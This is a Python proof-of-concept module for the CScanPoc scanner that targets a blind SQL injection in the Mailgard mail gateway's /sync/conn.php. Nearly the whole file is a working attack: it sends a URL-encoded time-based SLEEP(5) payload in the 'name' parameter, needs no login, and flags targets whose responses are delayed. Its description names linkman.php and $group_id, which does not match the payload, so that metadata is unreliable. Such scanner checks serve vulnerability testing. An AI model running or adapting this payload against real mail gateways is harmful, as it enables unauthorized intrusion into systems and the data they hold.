# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
import urllib.parse
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Mailgard_0002'  # 平台漏洞编号，留空
    name = 'Mailgard佑友系列邮件网关 conn.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-08'  # 漏洞公布时间
    desc = '''
        深圳市河辰通讯佑友系列邮件网关 ./sync/linkman.php里面有明显的SQL注射,$group_id由于没有包含global.php，所以全局过滤无效并且不需要登录即可访问，如果未开启magic_quotes_gpc则可注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3207/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Mailgard'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1654abae-0fb7-4c13-b315-50e166324918'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/sync/conn.php?token=1&name=admin%27%20AND%20%28SELECT%20*%20FROM%20%28SELECT%28SLEEP%285%29%29%29GgwK%29%20AND%20%27VBmy%27=%27VBmy"
            url = '{target}'.format(target=self.target)+payload
            start_time = time.time()
            code, head, res, errcode, _ = hh.http(url)

            if code == 200 and time.time() - start_time > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
